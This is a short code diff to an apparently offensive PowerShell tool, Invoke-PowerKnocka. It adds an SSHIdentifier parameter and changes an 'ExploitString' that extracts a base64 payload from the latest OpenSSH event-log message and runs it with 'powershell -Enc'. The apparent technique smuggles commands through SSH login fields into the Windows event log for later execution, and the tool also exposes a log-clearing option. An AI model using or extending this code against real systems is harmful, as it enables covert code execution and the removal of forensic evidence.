@@ -26,7 +26,13 @@ function Invoke-PowerKnocka {
         [Parameter(Mandatory)]
         [bool]$NBName,
 
-        [bool]$SSH = $false
+        [Parameter(Mandatory=$false)]
+        [switch]$SSH,
+
+        [Parameter(Mandatory=$false)]
+        [string]$SSHIdentifier = "-"
+
+
     )
 
     if ($DC) {
@@ -37,7 +43,7 @@ function Invoke-PowerKnocka {
     }
 
     if ($SSH) {
-        $ExploitString = '-Enc ((Get-WinEvent -LogName OpenSSH/Operational -MaxEvents 1 | Select -ExpandProperty Message) | %{$_.split(" ")[6]} | %{$_.split("-")[1]} | Get-Unique)'
+        $ExploitString = '-Enc ((Get-WinEvent -LogName OpenSSH/Operational -MaxEvents 1 | Select -ExpandProperty Message) | %{$_.split(" ")[6]} | %{$_.split("' + $SSHIdentifier + '")[1]} | Get-Unique)'
     }
 
     if ($ClearLog) {
